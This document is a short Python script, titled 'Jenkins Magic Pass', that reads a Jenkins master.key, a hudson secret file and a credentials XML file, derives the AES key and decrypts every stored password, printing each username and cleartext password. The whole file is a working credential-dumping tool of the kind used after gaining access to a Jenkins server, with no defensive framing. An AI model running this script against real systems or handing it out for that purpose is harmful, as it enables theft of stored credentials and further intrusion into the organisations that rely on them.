from re import findall
from hashlib import sha256
from Crypto.Cipher import AES
from sys import argv, exit
from base64 import decodestring

def openingFiles(file):
	with open(file, 'r') as file:
		contents = file.read()
	return contents

def extractHash(file):
	usernames = findall(r'<username>(.*?)</username>', file)
	passwords = findall(r'<password>(.*?)</password>', file)
	return usernames, passwords

def main():
	masterKey = openingFiles(argv[1])[:-1]
	secretKey = openingFiles(argv[2])
	users = openingFiles(argv[3])

	hashedMasterKey = sha256(masterKey).digest()[:16]
	o = AES.new(hashedMasterKey, AES.MODE_ECB)
	x = o.decrypt(secretKey)

	k = x[:-16]
	k = k[:16]

	usernames, passwords = extractHash(users)
	for users, passes in zip(usernames, passwords):
		password = decodestring(passes)
		o = AES.new(k, AES.MODE_ECB)
		passwd = o.decrypt(password)[:15]
		print('\t[+] Found: {}:{}'.format(users, passwd))

if __name__ == '__main__':
	print('[+] Jenkins Magic Pass')
	if len(argv) <= 3:
		print('[!] Uh oh! Usage: {} master.key hudson.secret creds.xml'.format(argv[0]))
		exit()
	main()
